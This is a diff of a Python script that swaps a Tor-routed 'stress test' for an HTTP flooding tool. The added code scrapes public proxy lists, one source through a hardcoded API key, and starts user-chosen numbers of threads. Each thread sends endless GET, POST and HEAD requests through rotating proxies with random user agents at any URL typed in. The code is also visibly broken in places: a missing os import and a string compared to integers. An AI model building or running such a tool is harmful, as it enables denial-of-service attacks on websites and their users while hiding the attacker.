@@ -1,9 +1,8 @@
-import aiohttp
-import asyncio
-from aiohttp_socks import ProxyConnector
-import numpy as np
-from datetime import datetime
-import os
+from user import users 
+import requests
+from threading import Thread
+import random
+
 
 # Clear screen
 os.system('cls' if os.name == 'nt' else 'clear')
@@ -21,89 +20,126 @@ LOGO = """
                                                      
 \033[0m
 """
+headers = {
+        'User-Agent' : random.choice(users)
+}
 
-async def test_url(url, proxy, concurrency=50, duration=60):
-    start_time = datetime.now()
-    request_count = 0
-    latencies = []
-    
-    try:
-        connector = ProxyConnector.from_url(proxy)
-        async with aiohttp.ClientSession(connector=connector) as session:
-            print(f"[*] Starting stress test on {url} with proxy {proxy}")
-            tasks = []
-            
-            async def single_request():
-                nonlocal request_count
-                try:
-                    start = asyncio.get_event_loop().time()
-                    async with session.get(url, headers={'X-Stress-Test': 'StressTestPro'}, timeout=10) as response:
-                        await response.read()
-                        latency = asyncio.get_event_loop().time() - start
-                        latencies.append(latency)
-                        request_count += 1
-                        print(f"\033[32m[+] Success | Status: {response.status} | Latency: {latency*1000:.2f}ms")
-                except Exception as e:
-                    print(f"\033[33m[❌] Request failed:\033[31m {e}")
-            
-            while (datetime.now() - start_time).total_seconds() < duration:
-                tasks = [single_request() for _ in range(concurrency)]
-                await asyncio.gather(*tasks, return_exceptions=True)
-                await asyncio.sleep(0.1)  # Prevent overwhelming the server
-            
-            # Calculate metrics
-            if latencies:
-                      print(f"\033[92m Test completed. Requests sent: {request_count}")
-                      print(f"\033[32m RPS: {request_count / duration:.2f}")
-                      print(f"\033[37m Latency (ms): P50={np.percentile(latencies, 50)*1000:.2f}, "
-                      f"P95={np.percentile(latencies, 95)*1000:.2f}, "
-                      f"P99={np.percentile(latencies, 99)*1000:.2f}")
-            else:
-                print("\033[95m[!] No successful requests.")
-    
-    except Exception as e:
-        print(f"\033[31m[!] Error with proxy {proxy}: {e}")
+url = input("url:")
+threads = int(input("Threads: "))
+global choice
+choice = input('proxy:')
 
-async def main():
-    print(LOGO)
-    
-    # Validate inputs
-    while True:
-        url = input("[?] Enter target URL: ").strip()
-        if url.startswith(('http://', 'https://')):
-            break
-        print("\033[91m[!] URL must start with http:// or https://")
-    
-    while True:
+
+def downloadproxy():
+    global proxfile
+    if choice == "1":
+        proxfile = 'http.txt'
+        f = open('http.txt', 'wb+')
         try:
-            concurrency = int(input("[?] Enter concurrency (50-1000): ").strip())
-            if 50 <= concurrency <= 1000:
-                break
-            print("\033[91m[!] Concurrency must be between 50 and 1000")
-        except ValueError:
-            print("\033[91m[!] Please enter a valid number")
-    
-    while True:
+            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all",
+                             timeout=10)
+            f.write(r.content)
+        except:
+            pass
         try:
-            duration = int(input("[?] Enter duration in seconds (60-3600): ").strip())
-            if 60 <= duration <= 3600:
-                break
-            print("\033[91m[!] Duration must be between 60 and 3600")
-        except ValueError:
-            print("\033[91m[!] Please enter a valid number\033[0m")
-    
-    # Use Tor proxy
-    tor_proxy = "socks5://127.0.0.1:9150"  # Tor Browser
-    tor_proxy = "socks5://127.0.0.1:9050"  # Tor service
-    
-    print(f"\033[93m[*] Using Tor proxy: {tor_proxy}\
-    ")
-    await test_url(url, tor_proxy, concurrency, duration)
+            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=10)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=http&lastchecked=60",
+                timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            f.close()
+    if choice == "5":
+        proxfile = 'socks5.txt'
+        f = open('socks5.txt', 'wb+')
+        try:
+            r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all",
+                             timeout=10)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=10)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://proxy-daily.com/api/getproxylist?apikey=3Rr6lb-yfeQeotZ2-9M76QI&format=ipport&type=socks5&lastchecked=60",
+                timeout=10)
+            f.write(r.content)
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://gist.githubusercontent.com/Azuures/1e0cb7a1097c720b4ed2aa63acd82179/raw/97d2d6a11873ffa8ca763763f7a5dd4035bcf95f/fwefnwex",
+                timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            pass
+        try:
+            r = requests.get(
+                "https://top-proxies.ru/free_proxy/downproxyfree.php",
+                timeout=10)
+            f.write(r.content)
+            f.close()
+        except:
+            print('top-prox')
+            f.close()
 
-if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        print("\033[91m[!] Test stopped by user.")
-    except Exception as e:
-        print(f"\033[91m[!] Fatal error: {e}")
+
+def send():
+        while True:
+                s = requests.Session()
+                if choice == 5:
+                        ff = str(random.choice(open('socks5.txt').readlines()))
+                        s.proxies['http'] = 'socks5://'+ ff
+                        s.proxies['https'] = 'socks5://' + ff
+                if choice == 1:
+                        ff = str(random.choice(open('http.txt').readlines()))
+                        s.proxies['http'] = 'http://' + ff
+                        s.proxies['https'] = 'https://' + ff
+                a = s.get(url, headers=headers)
+                # print(a)
+                print(f'get...    {a}')
+                aa = s.post(url, headers=headers, )
+                print(aa) ## aa - output request code. If 200, the proxies are working. 400 or something - they're not working. Same with a.s
+                print(f'post...     {aa}')
+                requests.head(url, headers=headers)
+                print("head...")
+
+if __name__ == '__main__':
+        downloadproxy()
+        for i in range (threads):
+                thr = Thread(target=send)
+                thr.start()
